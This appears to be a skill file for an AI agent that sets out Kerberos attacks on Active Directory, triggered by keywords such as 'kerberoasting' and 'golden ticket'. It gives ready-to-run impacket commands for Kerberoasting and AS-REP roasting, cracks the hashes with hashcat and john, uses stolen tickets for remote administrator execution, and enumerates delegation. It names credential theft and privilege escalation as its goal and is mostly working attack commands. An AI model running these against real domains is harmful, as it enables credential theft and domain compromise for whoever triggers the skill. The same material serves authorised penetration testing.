---
name: proto-kerberos
description: "Kerberos security testing — Kerberoasting, AS-REP roasting, Pass-the-Ticket, Golden/Silver Ticket, SPN enumeration, unconstrained delegation, constrained delegation bypass. Triggers: 'kerberos', 'kerberoasting', 'as-rep roasting', 'asreproast', 'pass the ticket', 'golden ticket', 'silver ticket', 'kerberos attack', 'spn attack', 'delegation attack'."
---

# Kerberos Security Testing

Exploit Kerberos authentication for credential theft and privilege escalation.

---

## Phase 1: Kerberoasting

```bash
DC_IP="TARGET_IP"
DOMAIN="target.local"
USER="user"
PASS="Password123"

impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC_IP" -outputfile output/kerberoast_hashes.txt 2>/dev/null

impacket-GetUserSPNs "$DOMAIN/" -dc-ip "$DC_IP" -outputfile output/kerberoast_hashes.txt 2>/dev/null

hashcat -m 13100 output/kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt 2>/dev/null | tee output/kerberoast_cracked.txt
john --wordlist=/usr/share/wordlists/rockyou.txt output/kerberoast_hashes.txt 2>/dev/null
```

---

## Phase 2: AS-REP Roasting

```bash
DC_IP="TARGET_IP"
DOMAIN="target.local"

impacket-GetNPUsers "$DOMAIN/" -dc-ip "$DC_IP" -usersfile output/ldap_users.txt \
  -format john -outputfile output/asrep_hashes.txt 2>/dev/null

impacket-GetNPUsers "$DOMAIN/user:pass" -dc-ip "$DC_IP" \
  -outputfile output/asrep_hashes.txt 2>/dev/null

hashcat -m 18200 output/asrep_hashes.txt /usr/share/wordlists/rockyou.txt 2>/dev/null
john --wordlist=/usr/share/wordlists/rockyou.txt output/asrep_hashes.txt 2>/dev/null
```

---

## Phase 3: Pass-the-Ticket

```bash
export KRB5CCNAME=/tmp/administrator.ccache

impacket-psexec -k -no-pass "$DOMAIN/administrator@DC_HOSTNAME" 2>/dev/null
impacket-smbexec -k -no-pass "$DOMAIN/administrator@TARGET" 2>/dev/null
impacket-wmiexec -k -no-pass "$DOMAIN/administrator@TARGET" 2>/dev/null
```

---

## Phase 4: Delegation Attacks

```bash
DC_IP="TARGET_IP"
DOMAIN="target.local"
USER="user"
PASS="Password123"

impacket-findDelegation "$DOMAIN/$USER:$PASS" -dc-ip "$DC_IP" 2>/dev/null | grep "Unconstrained"

impacket-findDelegation "$DOMAIN/$USER:$PASS" -dc-ip "$DC_IP" 2>/dev/null | grep "Constrained"

```

---

## Output

Save to `output/`:
- `kerberoast_hashes.txt` — Kerberoastable ticket hashes
- `asrep_hashes.txt` — AS-REP roastable hashes
- `kerberoast_cracked.txt` — cracked credentials

## Next Phase

→ `ad-attacks` for further AD exploitation
→ `post-credential-dumping` for hash extraction
